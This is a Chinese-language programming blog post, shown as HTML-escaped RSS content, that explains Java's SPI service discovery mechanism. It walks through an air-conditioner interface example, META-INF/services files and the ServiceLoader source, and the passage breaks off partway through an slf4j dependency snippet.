+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;八股文背多了，相信大家都听说过一个词，&lt;strong&gt;SPI扩展&lt;/strong&gt;。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有的面试官就很喜欢问这个问题，&lt;strong&gt;SpringBoot的自动装配是如何实现的？&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;基本上，你一说是基于spring的SPI扩展机制，再把&lt;code&gt;spring.factories&lt;/code&gt;文件和&lt;code&gt;EnableAutoConfiguration&lt;/code&gt;提一下，那么这个问题就答的八九不离十了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;就像四五年前，我去面试的时候被问到这个问题，&lt;strong&gt;SPI动态扩展机制&lt;/strong&gt;这几个词从嘴里一说出来，就把面试官唬的一愣一愣的。可能他们也没见过这么能装逼的，一句话能简简单单说明白，非要拽一个听上去很高大上的词。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;话说回来，被唬住的可不止是面试官，其实还有我自己。至于SPI扩展究竟是个啥，是怎么实现的，我当时也根本不明白。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;不过现在的面试就是这样，对线八股文，要想唬住面试官，就得先唬住自己。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那么我们今天暂且不提spring的SPI扩展，先来看看java本身自带的SPI扩展机制是怎么一回事。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;1、简介&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;SPI的全称是&lt;code&gt;Service Provider Interface&lt;/code&gt;，翻译过来就是&lt;strong&gt;服务提供者的接口&lt;/strong&gt;，它所实现的其实是一种服务的发现机制。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这么说起来可能还是有点不好理解，我举个例子来类比一下。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在spring项目中，写service层代码前，会约定俗成的会添加一个接口层。然后通过spring中的依赖注入，可以借助&lt;code&gt;@Autowired&lt;/code&gt;等方式注入这个接口的实现类的实例对象，之后对于service的调用一般也基于接口操作。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;简单形容就是这样的：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.569620253164557&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvsQXtFUib1xJNic4PaV02N4RkhlZClwoIA8JKJkmIt4VeQRf8w3Ipue8w/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;711&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如图所示，接口、实现类都是由服务提供方提供，我们可以把controller看作服务调用者，调用方只管调用接口就可以了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;虽然也有声音认为，大部分情况下service只有一个实现类，接口层显得有些多余。但是在《Head First Design Patterns》这本书中，大佬们还是建议过：&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;p&gt;Program to an interface, not an implementation.&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;没错，就是常说的&lt;strong&gt;要面向接口编程&lt;/strong&gt;。至于好处，也不外乎是降低耦合度、方便日后扩展、提高了代码的灵活性和可维护性等等。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在上面这个例子里，这个接口层和其中的方法我们可以称之为&lt;strong&gt;API&lt;/strong&gt;，而我们要讨论的&lt;strong&gt;SPI&lt;/strong&gt;和它相比，有类似也有差异，还是先看图：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5540355677154583&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvncqKicLHDvfeVsq4WkkUqDl3qc9iceQNmRMHQnN1Ka1RDV20ltwMmwHg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;731&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;简单来说，就是服务的调用方定义一个接口规范，可以由不同的服务提供者实现。并且，调用方能够通过某种机制来发现服务提供方，并通过接口调用它的能力。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过对比，我们可以看出它们虽然都有着&lt;strong&gt;接口&lt;/strong&gt;这一层面，但还是有很大的不同：&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;API中的接口是服务提供者给服务调用者的一个功能列表，而SPI中更多强调的是，服务调用者对服务实现的一种约束，服务提供者根据这种约束实现的服务，可以被服务调用者发现。&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;说白了，Java中的SPI实现的就是，你按我的接口规范实现服务，我就能通过某种机制为这个接口寻找到这个服务。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这么说起来可能还有些抽象，下面我们举一个例子，类比具体描述一下这个过程。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;2、定义接口&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;说起智能家居系统，大家现在都比较熟悉了，只要是相同品牌下的产品，连上wifi就能够通过手机app控制了，非常方便。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;虽然产品不断更新换代，型号更新层出不穷，但是同种家电在app上操作起来，功能一般都是一样的。就拿空调来说，我们在app上操作起来一般也就三个主要功能：&lt;strong&gt;开关&lt;/strong&gt;，&lt;strong&gt;选模式&lt;/strong&gt;，&lt;strong&gt;调节温度&lt;/strong&gt;。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;假设我现在在客厅、卧室、书房安装了3款不同型号的空调，并把它们都接入到了我app中，那么之后的操作都是相同的几个按键，简单粗暴。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;1.0044444444444445&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvxlScQERnvm4oEuDerMyhic9faUia6bFDysgEkDfggrIyYQZMwlV4OunQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;450&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;思考一下，无论是开关还是调温，都是通过app去调用设备的接口罢了，那么如果不同型号的空调各写各的接口，后端app在开发的时候光对接接口都麻烦的要死。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;解决方法也很简单，我先定义一套接口规范，不管你以后什么型号的空调，都按我的规范来实现接口。以后只要我能发现你的设备，那么都可以按相同的方法来调用接口。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那么下面就先来定义这么一套接口规范，如果你以后想要接入智能家居系统，那么就要遵循这个规范来开发接口。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;新建一个项目作为标准，就叫&lt;code&gt;aircondition-standard&lt;/code&gt;好了，然后创建一个接口。除了3个操作以外，我们再添加一个获取空调型号的方法。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;interface&lt;/span&gt; &lt;span&gt;IAircondition&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;// 获取型号&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;String &lt;span&gt;getType&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;    &lt;br/&gt;    &lt;span&gt;// 开关&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;void&lt;/span&gt; &lt;span&gt;turnOnOff&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// 调节温度&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;void&lt;/span&gt; &lt;span&gt;adjustTemperature&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; temperature)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;// 模式变更&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;void&lt;/span&gt; &lt;span&gt;changeModel&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; modelId)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个接口后面要给服务的实现方来使用，用maven把它打成jar包：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;mvn clean install&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;之后服务提供者在项目中就可以引入这个jar包了，有了这套规范，就保证了产品后期不管怎么更新换代，都能接入到系统来。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;3、服务实现&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;制定并发布完规则后，&lt;strong&gt;挂式空调&lt;/strong&gt;作为第一个服务提供者就来了，新建一个项目&lt;code&gt;aircondition-hanging-type&lt;/code&gt;，并引入刚才打好的jar包：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;&amp;lt;&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.cn.hydra&lt;span&gt;&amp;lt;/&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;aircondition-standard&lt;span&gt;&amp;lt;/&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&amp;lt;/&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;创建服务类，并实现前面定义的接口：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;HangingTypeAircondition&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;IAircondition&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getType&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;HangingType&quot;&lt;/span&gt;;&lt;br/&gt;    }&lt;br/&gt;    &lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;turnOnOff&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        System.out.println(&lt;span&gt;&quot;挂式空调开关&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;adjustTemperature&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; i)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        System.out.println(&lt;span&gt;&quot;挂式空调调节温度&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;changeModel&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; i)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        System.out.println(&lt;span&gt;&quot;挂式空调更换模式&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在项目的&lt;code&gt;resources&lt;/code&gt;的目录下，创建&lt;code&gt;META-INF/services&lt;/code&gt;目录，然后以前面定义的接口名&lt;code&gt;com.cn.hydra.IAircondition&lt;/code&gt;创建文件，并在文件中写入实现类的全限定名。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;com.cn.hydra.HangingTypeAircondition&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;整个项目结构非常简单：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.45&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgveHdCpm2HIKiaO6icEPnuL6CrkPbqr3AsqEwIOXOgN9dr0RIrgg7c7mGw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;960&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样，一个服务方的简单实现就搞定了，用maven打成jar包，之后就可以提供给调用方使用了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;同理，我们可以再创建一个&lt;strong&gt;立式空调&lt;/strong&gt;的项目&lt;code&gt;aircondition-vertical-type&lt;/code&gt;，也只创建一个服务类：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;VerticalTypeAircondition&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;IAircondition&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getType&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;VerticalType&quot;&lt;/span&gt;;&lt;br/&gt;    }&lt;br/&gt;    &lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;turnOnOff&lt;/span&gt;&lt;span&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        System.out.println(&lt;span&gt;&quot;立式空调开关&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;adjustTemperature&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; i)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        System.out.println(&lt;span&gt;&quot;立式空调调节温度&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;changeModel&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; i)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        System.out.println(&lt;span&gt;&quot;立式空调更换模式&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;还是按上面的命名规则，创建一个配置文件：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;com.cn.hydra.VerticalTypeAircondition&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;同样，打成jar包就完事了，至于服务调用者如何去发现和调用这两个服务，下面详细再说。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;4、服务发现&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;现在两个服务提供方都实现了接口，下面关键的一步就是服务发现，这一步java中的spi发现机制已经帮我们实现好了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;创建一个新项目&lt;code&gt;aircondition-app&lt;/code&gt;，引入上面打好的两个jar包。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;&amp;lt;&lt;span&gt;dependencies&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;&amp;lt;&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.cn.hydra&lt;span&gt;&amp;lt;/&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;&amp;lt;&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;aircondition-hanging-type&lt;span&gt;&amp;lt;/&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;&amp;lt;&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;/&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;&amp;lt;&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.cn.hydra&lt;span&gt;&amp;lt;/&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;&amp;lt;&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;aircondition-vertical-type&lt;span&gt;&amp;lt;/&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;        &lt;span&gt;&amp;lt;&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span&gt;&amp;lt;/&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;/&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&amp;lt;/&lt;span&gt;dependencies&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;按照上面的说法，虽然每个服务提供者对于接口都有不同的实现，但是作为调用者来说，它并不需要关心具体的实现类，我们要做的是通过接口来调用服务提供者实现的方法。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;下面，就是关键的服务发现环节，我们写一个方法，根据型号去调用对应空调的开关方法。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;AirconditionApp&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;new&lt;/span&gt; AirconditionApp().turnOn(&lt;span&gt;&quot;VerticalType&quot;&lt;/span&gt;);&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; &lt;span&gt;turnOn&lt;/span&gt;&lt;span&gt;(String type)&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;        ServiceLoader&amp;lt;IAircondition&amp;gt; load = ServiceLoader&lt;br/&gt;                .load(IAircondition&lt;span&gt;.&lt;span&gt;class&lt;/span&gt;)&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;        &lt;span&gt;for&lt;/span&gt; (IAircondition iAircondition : load) {&lt;br/&gt;            System.out.println(&lt;span&gt;&quot;检测到:&quot;&lt;/span&gt;+iAircondition.getClass().getSimpleName());&lt;br/&gt;            &lt;span&gt;if&lt;/span&gt; (type.equals(iAircondition.getType())){&lt;br/&gt;                iAircondition.turnOnOff();&lt;br/&gt;            }&lt;br/&gt;        }&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;测试结果：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.38996763754045305&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvYBqibxHMVIqx42OIMadPlpEnmEeUrKoEtibrMlZiaeyRoT02eDH6Z2BAg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;618&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;可以看到，测试过程中，通过定义的接口&lt;code&gt;IAircondition&lt;/code&gt;发现了两个实现类，并通过参数，调用了特定实现类的某个方法。整段代码中没有出现过具体的服务实现类，操作都是通过接口调用。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;5、原理&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;了解了spi的工作流程，我们再来看看它的实现，其实最关键的就是上面代码中出现的&lt;code&gt;ServiceLoader&lt;/code&gt;这个类。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;上面的示例代码中，对于&lt;code&gt;ServiceLoader&lt;/code&gt;的&lt;code&gt;load()&lt;/code&gt;方法的结果，我们用&lt;code&gt;for&lt;/code&gt;循环进行了遍历，这一点我们看一下源码就能明白，因为&lt;code&gt;ServiceLoader&lt;/code&gt;实现了&lt;code&gt;Iterable&lt;/code&gt;这一接口，而整个服务发现的核心，就在它的&lt;code&gt;iterator()&lt;/code&gt;方法中。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7875457875457875&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvdUlKNx3BzhJ2pv9XwI01QibpNSffOFWSHmYpaic8XJUkzVonrX39rN7g/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;819&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;注意这里面有两个关键的东西，找一下在源码中定义的地方：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.3041018387553041&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvE0VBUWsoZBLPtbbnMYAEzeIrvRZobcicssFXVTwELSL08GMgfR0C3UA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;707&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;注释写的非常明白，&lt;code&gt;providers&lt;/code&gt;就是一个缓存，在迭代器中如果先从这里面进行查找，如果里面有就继续往下找，没有了的话就用这个懒加载的&lt;code&gt;lookupIterator&lt;/code&gt;查找。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那么就简单了，接着往下看&lt;code&gt;LazyIterator&lt;/code&gt;，看看它里面的&lt;code&gt;hasNext()&lt;/code&gt;和&lt;code&gt;next()&lt;/code&gt;两个方法是怎么实现的。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7274939172749392&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvAP4huniaR59K63vBeUib5IH6qb6jtMHfzMzAcRDF16Mhz17J5dWYgsWQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;822&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个&lt;code&gt;acc&lt;/code&gt;是一个安全管理器，在前面通过&lt;code&gt;System.getSecurityManager()&lt;/code&gt;判断并赋值，debug看一下这里都是&lt;code&gt;null&lt;/code&gt;，所以直接看&lt;code&gt;hasNextService()&lt;/code&gt;和&lt;code&gt;nextService()&lt;/code&gt;方法就可以了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在&lt;code&gt;hasNextService()&lt;/code&gt;方法中，会取出接口取出实现类的类名放到&lt;code&gt;nextName&lt;/code&gt;中：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.5337124289195776&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvIMlNdWpAIiam0JdBV8qibErZ92LXKd1SX63XpGVomaSXqQnmic7nicSaaw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1231&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;接下来，在&lt;code&gt;nextService()&lt;/code&gt;方法中，则会先加载这个实现类，然后实例化对象，最终放入缓存中去。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-ratio=&quot;0.54911131898971&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvAiaW8tAn7dwe1IIg1RrQOoQb52FtG5T4m5n956kQjcibkeHbRicMNxVJg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1069&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在迭代器的迭代过程中，会完成所有实现类的实例化，其实归根结底，还是基于java反射去实现的。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;6、应用&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;要说spi的实际应用，大家最常见的应该就是日志框架&lt;code&gt;slf4j&lt;/code&gt;了，它利用spi实现了插槽式接入其他具体的日志框架。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;说白了，&lt;code&gt;slf4j&lt;/code&gt;本身就是个日志门面，并不提供具体的实现，需要绑定其他具体实现才能真正的引入日志功能。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;例如我们可使用&lt;code&gt;log4j2&lt;/code&gt;作为具体的绑定器，只需要在pom中引入&lt;code&gt;slf4j-log4j12&lt;/code&gt;，就可以使用具体功能。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;&amp;lt;&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    